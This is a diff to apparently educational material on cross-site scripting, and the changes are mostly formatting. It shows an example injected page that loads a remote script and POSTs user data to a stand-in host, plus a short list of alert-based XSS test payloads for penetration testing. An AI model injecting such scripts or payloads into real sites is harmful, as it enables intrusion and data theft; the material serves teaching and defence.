@@ -10,28 +10,28 @@ _Students should be able to interpret fragments of JavaScript related to cross-s
 Either the malicious code was inserted into the code base because it was accidentally inserted without [code reviews](../security_testing_approaches/README.md#Code_review) or an internal threat actor has intentionally inserted it, or an SQL/XXS code injection vulnerability has been exploited to insert it. Students should be able to identify that an script referring to a foreign context has been executed or that a POST request has been made to an unknown URL.
 
 ```html
-<HTML>
-    <HEAD>
-        <TITLE>Welcome to yourWebsite</TITLE>
-        <link href="http://yourwebsite.com/favicon.png" />
-    </HEAD>
-    <BODY>
-        <H1>Your Website</H1>
-    <SCRIPT src="http://www.randomUrl.com/danger.js"></SCRIPT>
+<html>
+  <head>
+    <title>Welcome to yourWebsite</title>
+    <link href="http://yourwebsite.com/favicon.png" />
+  </head>
+  <body>
+    <h1>Your Website</h1>
+    <script src="http://www.randomUrl.com/danger.js"></script>
 
     or
 
-    <SCRIPT>
-        const response = fetch("http://www.randomUrl.com", {
-            method: 'POST', 
-            headers: {
-            'Content-Type': 'application/json; charset=UTF-8',
-            },
+    <script>
+      const response = fetch("http://www.randomUrl.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json; charset=UTF-8",
+        },
         body: JSON.stringify(yourData),
-        });
-    </SCRIPT>
-    </BODY>
-</HTML>
+      });
+    </script>
+  </body>
+</html>
 ```
 
 ## How to penetrate test for this vulnerability
@@ -41,7 +41,7 @@ To use these scripts, paste them into any input boxes or after the URL in the br
 - `<script>alert(1)</script>`
 - `<img src=x onload(alert(1))>`
 - `<svg onload=alert(1)>`
-- `<iframe src=”javascript:alert(1)”></iframe>`
+- `<iframe src="javascript:alert(1)"></iframe>`
 
 ## How to countermeasure this vulnerability
 
